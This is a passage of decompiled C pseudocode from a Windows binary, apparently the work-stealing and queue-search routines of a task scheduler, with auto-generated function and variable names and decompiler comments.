  return 0;
}
// 13F15C0C0: using guessed type char var_38[24];
// 13F15C0C0: using guessed type char var_20[32];

//----- (000000013F15C17C) ----------------------------------------------------
__int64 __fastcall sub_13F15C17C(__int64 a1, _DWORD *a2)
{
  int v2; // ebx
  __int64 v3; // rbp
  __int64 result; // rax

  v2 = *(_DWORD *)(a1 + 288);
  v3 = a1 + 32;
  result = sub_13F149668(a1, v2, *(_DWORD *)(a1 + 144), a2, a1 + 32);
  if ( !result )
  {
    if ( v2 )
      return sub_13F149668(a1, 0, v2, a2, v3);
  }
  return result;
}

//----- (000000013F15C1E8) ----------------------------------------------------
__int64 __fastcall sub_13F15C1E8(__int64 a1, _DWORD *a2)
{
  int v2; // ebx
  __int64 v3; // rbp
  __int64 result; // rax

  v2 = *(_DWORD *)(a1 + 292);
  v3 = a1 + 160;
  result = sub_13F149668(a1, v2, *(_DWORD *)(a1 + 272), a2, a1 + 160);
  if ( !result )
  {
    if ( v2 )
      return sub_13F149668(a1, 0, v2, a2, v3);
  }
  return result;
}

//----- (000000013F15C258) ----------------------------------------------------
char __fastcall sub_13F15C258(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 v6; // rax
  char result; // al
  __int128 v8; // [rsp+20h] [rbp-28h]
  __int64 v9; // [rsp+30h] [rbp-18h]

  if ( a4 )
  {
    v6 = sub_13F158EF8(a3);
    if ( v6 )
    {
      LODWORD(v8) = 2;
      v9 = v6;
LABEL_4:
      result = 1;
      *((_QWORD *)&v8 + 1) = a3;
      *(_OWORD *)a2 = v8;
      *(_QWORD *)(a2 + 16) = v9;
      return result;
    }
  }
  else if ( sub_13F158F64(a3) )
  {
    LODWORD(v8) = 8;
    goto LABEL_4;
  }
  return 0;
}
// 13F15C299: variable 'v8' is possibly undefined
// 13F15C29C: variable 'v9' is possibly undefined

//----- (000000013F15C2C4) ----------------------------------------------------
char __fastcall sub_13F15C2C4(_QWORD *a1, __int64 a2, __int64 a3, char a4, int a5, char a6)
{
  __int64 v6; // rbx
  __int64 v11; // rbx

  v6 = *(_QWORD *)(a3 + 424);
  if ( !sub_13F15DA6C(a1, a3, 0i64, a5, a6) && sub_13F15C258((__int64)a1, a2, a3, a4) )
    return 1;
  if ( a5 )
    v11 = *(_QWORD *)(v6 + 24);
  else
    v11 = *(_QWORD *)(v6 + 32);
  while ( v11 )
  {
    if ( !sub_13F15DA6C(a1, v11, a3, a5, a6) && sub_13F15C258((__int64)a1, a2, v11, a4) )
      return 1;
    v11 = *(_QWORD *)(v11 + 432);
  }
  return 0;
}

//----- (000000013F15C394) ----------------------------------------------------
char __fastcall sub_13F15C394(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  __int64 v5; // xmm1_8
  char v7[40]; // [rsp+20h] [rbp-28h] BYREF

  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3 + 24i64))(a3);
  if ( v4 )
  {
    v4 = sub_13F15BFE4((__int64)v7, v4);
    *(_OWORD *)a2 = *(_OWORD *)v4;
    v5 = *(_QWORD *)(v4 + 16);
    LOBYTE(v4) = 1;
    *(_QWORD *)(a2 + 16) = v5;
  }
  return v4;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15C394: using guessed type char var_28[40];

//----- (000000013F15C3D8) ----------------------------------------------------
char __fastcall sub_13F15C3D8(_QWORD *a1, __int64 a2, __int64 a3, int a4, char a5)
{
  __int64 v5; // rbx
  __int64 v10; // rbx

  v5 = *(_QWORD *)(a3 + 424);
  if ( !sub_13F15DA6C(a1, a3, 0i64, a4, a5) && sub_13F15C394((__int64)a1, a2, a3) )
    return 1;
  if ( a4 )
    v10 = *(_QWORD *)(v5 + 24);
  else
    v10 = *(_QWORD *)(v5 + 32);
  while ( v10 )
  {
    if ( !sub_13F15DA6C(a1, v10, a3, a4, a5) && sub_13F15C394((__int64)a1, a2, v10) )
      return 1;
    v10 = *(_QWORD *)(v10 + 432);
  }
  return 0;
}

//----- (000000013F15C494) ----------------------------------------------------
char __fastcall sub_13F15C494(__int64 a1, __int64 a2, __int64 a3, char a4, char a5)
{
  __int64 v7; // rax
  char result; // al
  __int128 v9; // [rsp+20h] [rbp-28h]
  __int64 v10; // [rsp+30h] [rbp-18h]

  if ( a5 )
  {
    v7 = sub_13F1598F8(a3, a4);
    if ( v7 )
    {
      LODWORD(v9) = 4;
LABEL_4:
      v10 = v7;
      result = 1;
      *((_QWORD *)&v9 + 1) = a3;
      *(_OWORD *)a2 = v9;
      *(_QWORD *)(a2 + 16) = v10;
      return result;
    }
  }
  else
  {
    v7 = sub_13F159318(a3);
    if ( v7 )
    {
      LODWORD(v9) = 16;
      goto LABEL_4;
    }
  }
  return 0;
}
// 13F15C4DA: variable 'v9' is possibly undefined

//----- (000000013F15C508) ----------------------------------------------------
char __fastcall sub_13F15C508(_QWORD *a1, __int64 a2, __int64 a3, char a4, int a5, char a6)
{
  __int64 v6; // rbx
  __int64 v11; // rbx

  v6 = *(_QWORD *)(a3 + 424);
  if ( !sub_13F15DA6C(a1, a3, 0i64, a5, a6) && sub_13F15C494((__int64)a1, a2, a3, a6, a4) )
    return 1;
  if ( a5 )
    v11 = *(_QWORD *)(v6 + 24);
  else
    v11 = *(_QWORD *)(v6 + 32);
  while ( v11 )
  {
    if ( !sub_13F15DA6C(a1, v11, a3, a5, a6) && sub_13F15C494((__int64)a1, a2, v11, a6, a4) )
      return 1;
    v11 = *(_QWORD *)(v11 + 432);
  }
  return 0;
}

//----- (000000013F15C5E0) ----------------------------------------------------
__int64 __fastcall sub_13F15C5E0(__int64 a1)
{
  __int64 result; // rax

  if ( *(_DWORD *)a1 == 2 )
  {
    sub_13F15DDD4(*(_QWORD *)(a1 + 16));
    return sub_13F14B450(
             *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 424i64) + 8i64),
             *(__int64 (__fastcall ****)(_QWORD, __int64))(a1 + 16));
  }
  else if ( *(_DWORD *)a1 == 4 )
  {
    return (*(__int64 (**)(void))(*(_QWORD *)(a1 + 16) + 24i64))();
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15C630) ----------------------------------------------------
char __fastcall sub_13F15C630(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rax
  __int64 v4; // xmm1_8
  char v6[40]; // [rsp+20h] [rbp-28h] BYREF

  v3 = (*(__int64 (__fastcall **)(_QWORD))(*(_QWORD *)*a1 + 16i64))(*a1);
  if ( v3 )
  {
    v3 = sub_13F15BFE4((__int64)v6, v3);
    *(_OWORD *)a2 = *(_OWORD *)v3;
    v4 = *(_QWORD *)(v3 + 16);
    LOBYTE(v3) = 1;
    *(_QWORD *)(a2 + 16) = v4;
  }
  return v3;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15C630: using guessed type char var_28[40];

//----- (000000013F15C674) ----------------------------------------------------
bool __fastcall sub_13F15C674(__int64 a1, __int64 a2, __int64 a3, char a4, char a5)
{
  return (a5 & 1) != 0 && sub_13F15C394(a1, a3, a2)
      || (a5 & 0xA) != 0 && sub_13F15C258(a1, a3, a2, (a5 & 2) != 0)
      || (a5 & 0x14) != 0 && sub_13F15C494(a1, a3, a2, a4, (a5 & 4) != 0);
}

//----- (000000013F15C718) ----------------------------------------------------
bool __fastcall sub_13F15C718(__int64 a1, __int64 a2, __int64 a3, char a4, char a5)
{
  return (a5 & 0x14) != 0 && sub_13F15C494(a1, a3, a2, a4, (a5 & 4) != 0)
      || (a5 & 0xA) != 0 && sub_13F15C258(a1, a3, a2, (a5 & 2) != 0)
      || (a5 & 1) != 0 && sub_13F15C394(a1, a3, a2);
}

//----- (000000013F15C7A8) ----------------------------------------------------
void *__fastcall sub_13F15C7A8(__int64 a1, __int64 a2, int a3)
{
  __int64 v5; // rax
  void *result; // rax

  *(_DWORD *)(a1 + 20) = 0;
  *(_QWORD *)a1 = a2;
  *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 212);
  *(_QWORD *)(a1 + 8) = **(_QWORD **)(a2 + 120);
  v5 = sub_13F1426A8(a1);
  *(_QWORD *)(a1 + 32) = v5;
  *(_QWORD *)(a1 + 24) = v5;
  if ( a3 == 1 )
  {
    *(_QWORD *)(a1 + 40) = sub_13F15C8B0;
    result = sub_13F15CCC0;
  }
  else
  {
    *(_QWORD *)(a1 + 40) = sub_13F15D574;
    result = sub_13F15D6D0;
  }
  *(_QWORD *)(a1 + 48) = result;
  return result;
}
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);

//----- (000000013F15C81C) ----------------------------------------------------
bool __fastcall sub_13F15C81C(__int64 a1)
{
  __int64 v2; // rcx
  char v3; // al
  __int64 v4; // rdi
  __int64 v5; // rax
  __int64 v7; // [rsp+30h] [rbp+8h] BYREF

  if ( *(_DWORD *)a1 == 8 )
  {
    v5 = sub_13F158EF8(*(_QWORD *)(a1 + 8));
    if ( !v5 )
      return (*(_BYTE *)a1 & 0x18) == 0;
    *(_DWORD *)a1 = 2;
    goto LABEL_10;
  }
  if ( *(_DWORD *)a1 != 16 )
    return (*(_BYTE *)a1 & 0x18) == 0;
  v2 = *(_QWORD *)(a1 + 16);
  if ( v2 != 1 )
  {
    v5 = sub_13F15AC4C(v2, 0);
    if ( !v5 )
      return (*(_BYTE *)a1 & 0x18) == 0;
    *(_DWORD *)a1 = 4;
LABEL_10:
    *(_QWORD *)(a1 + 16) = v5;
    return (*(_BYTE *)a1 & 0x18) == 0;
  }
  v3 = -sub_13F158B94(*(_QWORD *)(a1 + 8) + 96i64, &v7);
  v4 = v7 & -(__int64)(v3 != 0);
  if ( v4 )
  {
    sub_13F15B180(v7 & -(__int64)(v3 != 0), 1);
    *(_QWORD *)(a1 + 16) = v4;
    *(_DWORD *)a1 = 4;
  }
  return (*(_BYTE *)a1 & 0x18) == 0;
}

//----- (000000013F15C8B0) ----------------------------------------------------
char __fastcall sub_13F15C8B0(__int64 a1, __int64 a2, __int64 a3, char a4, int a5)
{
  bool v5; // bl
  char v6; // r14
  __int64 v10; // rcx
  signed __int64 v12; // rax
  __int64 v13; // r8
  __int64 v14; // rcx
  _DWORD *v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // r12
  bool v20; // al
  char v21; // r11
  __int64 v22; // r12
  char v23; // r10
  __int64 v24; // r9
  __int64 v25; // r8
  unsigned __int64 v26; // rdx
  bool v27; // al
  __int64 v28; // rcx
  __int64 v29; // r15
  __int64 v30; // r8
  __int64 v31; // [rsp+30h] [rbp-81h]
  char v33; // [rsp+41h] [rbp-70h]
  __int64 v34; // [rsp+48h] [rbp-69h]
  __int64 v35; // [rsp+50h] [rbp-61h]
  __int64 v36; // [rsp+60h] [rbp-51h]
  int v37[2]; // [rsp+68h] [rbp-49h] BYREF
  __int64 v38; // [rsp+70h] [rbp-41h]
  __int64 v39; // [rsp+78h] [rbp-39h]
  __int64 v40; // [rsp+80h] [rbp-31h]
  char v41[24]; // [rsp+88h] [rbp-29h] BYREF
  __int64 v42; // [rsp+A0h] [rbp-11h]
  int v43; // [rsp+A8h] [rbp-9h]

  v5 = 0;
  v6 = 0;
  v40 = a3;
  if ( sub_13F15C630((_QWORD *)a1, a2) )
    return 1;
  v12 = sub_13F1426A8(v10);
  v13 = *(_QWORD *)(a1 + 8);
  *(_QWORD *)(a1 + 24) = v12;
  if ( (unsigned __int64)(v12 - *(_QWORD *)(v13 + 648)) > 0x7D0 )
    sub_13F14AC4C(v13, v12);
  if ( *(_QWORD *)(a1 + 24) - *(_QWORD *)(a1 + 32) > 0x3E8ui64 )
  {
    *(_QWORD *)(a1 + 32) = *(_QWORD *)(a1 + 24);
    v14 = *(_QWORD *)(a1 + 8);
    if ( *(_QWORD *)(v14 + 504) )
    {
      while ( 1 )
      {
        v15 = (_DWORD *)sub_13F149EA8(v14);
        if ( !v15 )
          break;
        if ( *v15 )
        {
          if ( (a5 & 1) != 0 )
          {
            v16 = sub_13F15DCE0((__int64)(v15 - 82));
            if ( v16 )
            {
              v17 = sub_13F15BFE4((__int64)v41, v16);
              *(_OWORD *)a2 = *(_OWORD *)v17;
              *(_QWORD *)(a2 + 16) = *(_QWORD *)(v17 + 16);
LABEL_15:
              v6 = 1;
              break;
            }
          }
        }
        else if ( sub_13F15C674(a1, (__int64)(v15 - 112), a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v14 = *(_QWORD *)(a1 + 8);
      }
    }
    *(_BYTE *)(*(_QWORD *)a1 + 154i64) = 1;
  }
  v18 = *(_QWORD *)a1;
  v19 = *(_QWORD *)(*(_QWORD *)a1 + 128i64);
  v36 = v19;
  if ( v6 )
    goto LABEL_53;
  v42 = 1i64;
  v43 = 2;
  if ( *(_BYTE *)(v18 + 152) )
  {
    v21 = a4;
  }
  else
  {
    v20 = sub_13F15450C(v18);
    v21 = a4;
    if ( !v20 && !a4 )
    {
      v22 = 1i64;
      goto LABEL_24;
    }
  }
  v22 = 0i64;
LABEL_24:
  v23 = 1;
  v33 = 1;
  do
  {
    if ( v22 > 2 )
      break;
    v35 = v40;
    v34 = v36;
    if ( v36 )
    {
      while ( 1 )
      {
        v24 = *(_QWORD *)(a1 + 8);
        v25 = (unsigned int)(16 * *(_DWORD *)(a1 + 16));
        if ( *(_QWORD *)(*(_QWORD *)(v24 + 160) + 8 * v25) <= 1ui64
          || (v26 = *(_QWORD *)(*(_QWORD *)(v24 + 160) + 8 * v25), v26 <= 1)
          || v26 != _InterlockedCompareExchange64(
                      (volatile signed __int64 *)(*(_QWORD *)(v24 + 160) + 8 * v25),
                      1i64,
                      v26) )
        {
          v26 = 0i64;
        }
        if ( v26 )
        {
          v27 = sub_13F15C674(a1, v26, a2, v21, a5);
          v23 = v33;
          if ( v27 )
            break;
        }
        if ( v23 && (a5 & 1) != 0 )
        {
          if ( sub_13F15C0C0(a1, a2, *(_QWORD *)a1, 0) )
            goto LABEL_48;
          v23 = v33;
        }
        if ( (a5 & 1) != 0
          && (LODWORD(v31) = a5, sub_13F15D1C4(a1, a2, (_DWORD *)v34, v35, v23, *((_DWORD *)&v42 + v22), v31, a4))
          || (a5 & 0xA) != 0
          && (LODWORD(v31) = a5,
              sub_13F15D008(a1, a2, (_DWORD *)v34, v35, (a5 & 2) != 0, *((_DWORD *)&v42 + v22), v31, a4))
          || (a5 & 0x14) != 0
          && (LODWORD(v31) = a5,
              sub_13F15D3A0(a1, a2, (_DWORD *)v34, v35, (a5 & 4) != 0, *((_DWORD *)&v42 + v22), v31, a4))
          || (a5 & 1) != 0 && v22 == 2 && sub_13F15DC1C(a1, a2, *(_QWORD *)(v34 + 8), *(_QWORD *)a1) )
        {
LABEL_48:
          v23 = v33;
          break;
        }
        v33 = 0;
        v35 = 0i64;
        v34 = sub_13F149FA4(*(_QWORD *)(a1 + 8), v36, v34);
        v23 = 0;
        if ( !v34 )
          goto LABEL_50;
        v21 = a4;
      }
      v6 = 1;
    }
LABEL_50:
    v21 = a4;
    ++v22;
  }
  while ( !v6 );
  if ( !v6 )
    return v6;
  v19 = v36;
LABEL_53:
  v28 = *(_QWORD *)(a2 + 8);
  v29 = *(_QWORD *)(v28 + 16);
  if ( (unsigned int)*(_QWORD *)(a1 + 24) - *(_DWORD *)(v28 + 440) > 0x64 )
    *(_QWORD *)(v28 + 440) = *(_QWORD *)(a1 + 24);
  if ( (*(_DWORD *)(v28 + 24) & 0xFFFFFFF) != 0 )
  {
    v30 = *(_QWORD *)a1 + 216i64;
    v37[0] ^= (v37[0] ^ *(_DWORD *)v30) & 0xFFFFFFF;
    v37[0] = *(_DWORD *)v30 ^ (v37[0] ^ *(_DWORD *)v30) & 0xFFFFFFF;
    v38 = *(_QWORD *)(v30 + 8);
    v37[1] = *(_DWORD *)(v30 + 4);
    v39 = *(_QWORD *)(v30 + 16);
    v5 = sub_13F15BF9C((__int64)v37, (_DWORD *)(v28 + 24));
  }
  sub_13F1551EC(*(_QWORD *)a1, v5, v29 == v19);
  return v6;
}
// 13F15C8FE: variable 'v10' is possibly undefined
// 13F15CB06: variable 'v31' is possibly undefined
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);
// 13F15C8B0: using guessed type char var_78[24];

//----- (000000013F15CCC0) ----------------------------------------------------
char __fastcall sub_13F15CCC0(__int64 *a1, __int64 a2, __int64 a3, char a4, int a5)
{
  __int64 v6; // r12
  char v9; // di
  __int64 v10; // rcx
  signed __int64 v12; // rax
  __int64 v13; // r8
  __int64 v14; // rcx
  _DWORD *v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // r14
  __int64 v20; // rsi
  int v21; // ecx
  __int64 v22; // r13
  int v23; // eax
  __int64 v24; // rdx
  __int64 v25; // rcx
  __int64 v26; // [rsp+30h] [rbp-A8h]
  char v28; // [rsp+41h] [rbp-97h]
  __int64 v29; // [rsp+48h] [rbp-90h]
  char v31[24]; // [rsp+60h] [rbp-78h] BYREF
  int v32[4]; // [rsp+78h] [rbp-60h]

  v6 = a3;
  v9 = 0;
  if ( sub_13F15C630(a1, a2) )
    return 1;
  v12 = sub_13F1426A8(v10);
  v13 = a1[1];
  a1[3] = v12;
  if ( (unsigned __int64)(v12 - *(_QWORD *)(v13 + 648)) > 0x7D0 )
    sub_13F14AC4C(v13, v12);
  if ( (unsigned __int64)(a1[3] - a1[4]) > 0x3E8 )
  {
    a1[4] = a1[3];
    v14 = a1[1];
    if ( *(_QWORD *)(v14 + 504) )
    {
      while ( 1 )
      {
        v15 = (_DWORD *)sub_13F149EA8(v14);
        if ( !v15 )
          break;
        if ( *v15 )
        {
          if ( (a5 & 1) != 0 )
          {
            v16 = sub_13F15DCE0((__int64)(v15 - 82));
            if ( v16 )
            {
              v17 = sub_13F15BFE4((__int64)v31, v16);
              *(_OWORD *)a2 = *(_OWORD *)v17;
              *(_QWORD *)(a2 + 16) = *(_QWORD *)(v17 + 16);
LABEL_15:
              v9 = 1;
              break;
            }
          }
        }
        else if ( sub_13F15C718((__int64)a1, (__int64)(v15 - 112), a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v14 = a1[1];
      }
    }
    *(_BYTE *)(*a1 + 154) = 1;
  }
  v18 = *a1;
  v19 = *(_QWORD *)(*a1 + 128);
  v29 = v19;
  if ( v9 )
    goto LABEL_46;
  v32[1] = 0;
  v32[0] = 1;
  v32[2] = 2;
  v20 = !*(_BYTE *)(v18 + 152) && !sub_13F15450C(v18) && !a4;
  v28 = 1;
  do
  {
    if ( v20 > 2 )
      break;
    v21 = v32[v20];
    v22 = v19;
    if ( v19 )
    {
      v23 = a5 & 0x14;
      while ( 1 )
      {
        if ( v23 )
        {
          LODWORD(v26) = a5;
          if ( sub_13F15D3A0((__int64)a1, a2, (_DWORD *)v22, v6, (a5 & 4) != 0, v21, v26, a4) )
            break;
          v21 = v32[v20];
        }
        if ( (a5 & 0xA) != 0 )
        {
          LODWORD(v26) = a5;
          if ( sub_13F15D008((__int64)a1, a2, (_DWORD *)v22, v6, (a5 & 2) != 0, v21, v26, a4) )
            break;
        }
        if ( (a5 & 1) != 0
          && (LODWORD(v26) = a5, sub_13F15D1C4((__int64)a1, a2, (_DWORD *)v22, v6, v28, v32[v20], v26, a4))
          || (a5 & 1) != 0 && v20 == 2 && sub_13F15DC1C((__int64)a1, a2, *(_QWORD *)(v22 + 8), *a1)
          || v28 && (a5 & 1) != 0 && sub_13F15C0C0((__int64)a1, a2, *a1, 1) )
        {
          v19 = v29;
          break;
        }
        v19 = v29;
        v28 = 0;
        v6 = 0i64;
        v22 = sub_13F149FA4(a1[1], v29, v22);
        if ( !v22 )
          goto LABEL_44;
        v23 = a5 & 0x14;
        v21 = v32[v20];
      }
      v9 = 1;
    }
LABEL_44:
    v6 = a3;
    ++v20;
  }
  while ( !v9 );
  if ( v9 )
  {
LABEL_46:
    v24 = *(_QWORD *)(a2 + 8);
    v25 = *(_QWORD *)(v24 + 16);
    if ( (unsigned int)a1[3] - *(_DWORD *)(v24 + 440) > 0x64 )
    {
      *(_QWORD *)(v24 + 440) = a1[3];
      v24 = *(_QWORD *)(a2 + 8);
    }
    sub_13F1551EC(*a1, (*(_DWORD *)(v24 + 24) & 0xFFFFFFF) == 0, v25 == v19);
  }
  return v9;
}
// 13F15CD0F: variable 'v10' is possibly undefined
// 13F15CE8B: variable 'v26' is possibly undefined
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);
// 13F15CCC0: using guessed type char var_78[24];

//----- (000000013F15D008) ----------------------------------------------------
char __fastcall sub_13F15D008(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8)
{
  int v8; // edi
  char v10; // r12
  __int64 v14; // rax
  int v15; // er13
  __int64 v16; // rsi
  bool i; // zf
  __int64 v18; // r9
  __int64 v19; // r8
  unsigned __int64 v20; // rdx
  int v22; // [rsp+78h] [rbp+20h] BYREF

  v8 = a6;
  v10 = a8;
  if ( !a4 || !sub_13F15C2C4((_QWORD *)a1, a2, a4, a5, a6, a8) )
  {
    if ( v8 )
      v14 = sub_13F15C17C((__int64)a3, &v22);
    else
      v14 = sub_13F15C1E8((__int64)a3, &v22);
    v15 = v22;
    v16 = v14;
    for ( i = v14 == 0; ; i = v16 == 0 )
    {
      if ( i )
        return 0;
      v18 = *(_QWORD *)(a1 + 8);
      v19 = (unsigned int)(16 * *(_DWORD *)(a1 + 16));
      if ( *(_QWORD *)(*(_QWORD *)(v18 + 160) + 8 * v19) <= 1ui64
        || (v20 = *(_QWORD *)(*(_QWORD *)(v18 + 160) + 8 * v19), v20 <= 1)
        || v20 != _InterlockedCompareExchange64(
                    (volatile signed __int64 *)(*(_QWORD *)(v18 + 160) + 8 * v19),
                    1i64,
                    v20) )
      {
        v20 = 0i64;
      }
      if ( v20 && sub_13F15C674(a1, v20, a2, v10, a7) )
        return 1;
      if ( !sub_13F15DA6C((_QWORD *)a1, v16, a4, v8, v10) && sub_13F15C258(a1, a2, v16, a5) )
        break;
      v16 = sub_13F149F2C((__int64)a3, &v22, v15, (__int64)a3 + (-(__int64)(v8 != 0) & 0xFFFFFFFFFFFFFF80ui64) + 160);
    }
    if ( v8 )
      a3[72] = (v22 + 1) % a3[36];
    else
      a3[73] = (v22 + 1) % a3[68];
  }
  return 1;
}

//----- (000000013F15D1C4) ----------------------------------------------------
char __fastcall sub_13F15D1C4(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8)
{
  char v8; // r12
  __int64 v13; // rax
  int v14; // er13
  __int64 v15; // rbp
  bool i; // zf
  __int64 v17; // r9
  __int64 v18; // r8
  unsigned __int64 v19; // rdx
  int v21; // [rsp+78h] [rbp+20h] BYREF

  v8 = a8;
  if ( (!a4 || !sub_13F15C3D8((_QWORD *)a1, a2, a4, a6, a8))
    && (!a5 || !sub_13F15DC1C(a1, a2, *(_QWORD *)(*(_QWORD *)a1 + 120i64), *(_QWORD *)a1)) )
  {
    if ( a6 )
      v13 = sub_13F15C17C((__int64)a3, &v21);
    else
      v13 = sub_13F15C1E8((__int64)a3, &v21);
    v14 = v21;
    v15 = v13;
    for ( i = v13 == 0; ; i = v15 == 0 )
    {
      if ( i )
        return 0;
      v17 = *(_QWORD *)(a1 + 8);
      v18 = (unsigned int)(16 * *(_DWORD *)(a1 + 16));
      if ( *(_QWORD *)(*(_QWORD *)(v17 + 160) + 8 * v18) <= 1ui64
        || (v19 = *(_QWORD *)(*(_QWORD *)(v17 + 160) + 8 * v18), v19 <= 1)
        || v19 != _InterlockedCompareExchange64(
                    (volatile signed __int64 *)(*(_QWORD *)(v17 + 160) + 8 * v18),
                    1i64,
                    v19) )
      {
        v19 = 0i64;
      }
      if ( v19 && sub_13F15C674(a1, v19, a2, v8, a7) )
        return 1;
      if ( !sub_13F15DA6C((_QWORD *)a1, v15, a4, a6, v8) && sub_13F15C394(a1, a2, v15) )
        break;
      v15 = sub_13F149F2C((__int64)a3, &v21, v14, (__int64)a3 + (-(__int64)(a6 != 0) & 0xFFFFFFFFFFFFFF80ui64) + 160);
    }
    if ( a6 )
      a3[72] = (v21 + 1) % a3[36];
    else
      a3[73] = (v21 + 1) % a3[68];
  }
  return 1;
}

//----- (000000013F15D3A0) ----------------------------------------------------
char __fastcall sub_13F15D3A0(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4, char a5, int a6, __int64 a7, char a8)
{
  int v8; // edi
  char v10; // r14
  char v12; // r13
  __int64 v15; // rax
  __int64 v16; // rsi
  bool i; // zf
  __int64 v18; // r9
  __int64 v19; // r8
  unsigned __int64 v20; // rdx
  int v22; // [rsp+30h] [rbp-38h]
  int v23; // [rsp+88h] [rbp+20h] BYREF

  v8 = a6;
  v10 = a8;
  v12 = a5;
  if ( !a4 || !sub_13F15C508((_QWORD *)a1, a2, a4, a5, a6, a8) )
  {
    if ( v8 )
      v15 = sub_13F15C17C((__int64)a3, &v23);
    else
      v15 = sub_13F15C1E8((__int64)a3, &v23);
    v16 = v15;
    v22 = v23;
    for ( i = v15 == 0; ; i = v16 == 0 )
    {
      if ( i )
        return 0;
      v18 = *(_QWORD *)(a1 + 8);
      v19 = (unsigned int)(16 * *(_DWORD *)(a1 + 16));
      if ( *(_QWORD *)(*(_QWORD *)(v18 + 160) + 8 * v19) <= 1ui64
        || (v20 = *(_QWORD *)(*(_QWORD *)(v18 + 160) + 8 * v19), v20 <= 1)
        || v20 != _InterlockedCompareExchange64(
                    (volatile signed __int64 *)(*(_QWORD *)(v18 + 160) + 8 * v19),
                    1i64,
                    v20) )
      {
        v20 = 0i64;
      }
      if ( v20 && sub_13F15C674(a1, v20, a2, v10, a7) )
        return 1;
      if ( !sub_13F15DA6C((_QWORD *)a1, v16, a4, v8, v10) && sub_13F15C494(a1, a2, v16, v10, v12) )
        break;
      v16 = sub_13F149F2C((__int64)a3, &v23, v22, (__int64)a3 + (-(__int64)(v8 != 0) & 0xFFFFFFFFFFFFFF80ui64) + 160);
    }
    if ( v8 )
      a3[72] = (v23 + 1) % a3[36];
    else
      a3[73] = (v23 + 1) % a3[68];
  }
  return 1;
}

//----- (000000013F15D574) ----------------------------------------------------
char __fastcall sub_13F15D574(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, char a5)
{
  char v7; // si
  __int64 v9; // rax
  __int64 v10; // rbx
  __int64 i; // rbp
  char v12; // al
  __int64 v13; // rcx
  __int64 v14; // r15
  char v15; // al
  char v16; // al
  __int64 v17; // rdx

  v7 = 0;
  if ( sub_13F15C630(a1, a2) )
    return 1;
  v9 = sub_13F149FE4(a1[1]);
  v10 = v9;
  if ( (a5 & 1) == 0 )
    goto LABEL_23;
  for ( i = v9; i; i = sub_13F149FA4(v13, v10, i) )
  {
    v12 = sub_13F15D8F0((__int64)a1, a2, i);
    v13 = a1[1];
    v7 = v12;
    if ( v12 )
      goto LABEL_18;
  }
  v7 = sub_13F15DB44((__int64)a1, a2, *(_QWORD *)(*a1 + 120i64));
  if ( !v7 )
  {
LABEL_23:
    if ( (a5 & 0xA) != 0 )
    {
      v14 = v10;
      if ( v10 )
      {
        while ( 1 )
        {
          v15 = sub_13F15D820((__int64)a1, a2, v14, (a5 & 2) != 0);
          v13 = a1[1];
          v7 = v15;
          if ( v15 )
            break;
          v14 = sub_13F149FA4(v13, v10, v14);
          if ( !v14 )
            goto LABEL_12;
        }
        v17 = v14;
        goto LABEL_19;
      }
    }
LABEL_12:
    if ( (a5 & 0x14) == 0 )
      return v7;
    i = v10;
    if ( !v10 )
      return v7;
    while ( 1 )
    {
      v16 = sub_13F15D998((__int64)a1, a2, i, (a5 & 4) != 0);
      v13 = a1[1];
      v7 = v16;
      if ( v16 )
        break;
      i = sub_13F149FA4(v13, v10, i);
      if ( !i )
        return v7;
    }
LABEL_18:
    v17 = i;
LABEL_19:
    sub_13F14BC94(v13, v17);
  }
  return v7;
}

//----- (000000013F15D6D0) ----------------------------------------------------
char __fastcall sub_13F15D6D0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, char a5)
{
  char v7; // bp
  __int64 v9; // rax
  __int64 v10; // rbx
  __int64 i; // r15
  char v12; // al
  __int64 v13; // rcx
  char v14; // al
  __int64 v15; // rsi
  char v16; // al
  __int64 v17; // rdx

  v7 = 0;
  if ( sub_13F15C630(a1, a2) )
    return 1;
  v9 = sub_13F149FE4(a1[1]);
  v10 = v9;
  if ( (a5 & 0x14) != 0 )
  {
    for ( i = v9; i; i = sub_13F149FA4(v13, v10, i) )
    {
      v12 = sub_13F15D998((__int64)a1, a2, i, (a5 & 4) != 0);
      v13 = a1[1];
      v7 = v12;
      if ( v12 )
        goto LABEL_17;
    }
  }
  if ( (a5 & 0xA) != 0 )
  {
    i = v10;
    if ( v10 )
    {
      while ( 1 )
      {
        v14 = sub_13F15D820((__int64)a1, a2, i, (a5 & 2) != 0);
        v13 = a1[1];
        v7 = v14;
        if ( v14 )
          break;
        i = sub_13F149FA4(v13, v10, i);
        if ( !i )
          goto LABEL_11;
      }
LABEL_17:
      v17 = i;
LABEL_19:
      sub_13F14BC94(v13, v17);
      return v7;
    }
  }
LABEL_11:
  if ( (a5 & 1) != 0 )
  {
    v15 = v10;
    if ( v10 )
    {
      while ( 1 )
      {
        v16 = sub_13F15D8F0((__int64)a1, a2, v15);
        v13 = a1[1];
        v7 = v16;
        if ( v16 )
          break;
        v15 = sub_13F149FA4(v13, v10, v15);
        if ( !v15 )
          return sub_13F15DB44((__int64)a1, a2, *(_QWORD *)(*a1 + 120i64));
      }
      v17 = v15;
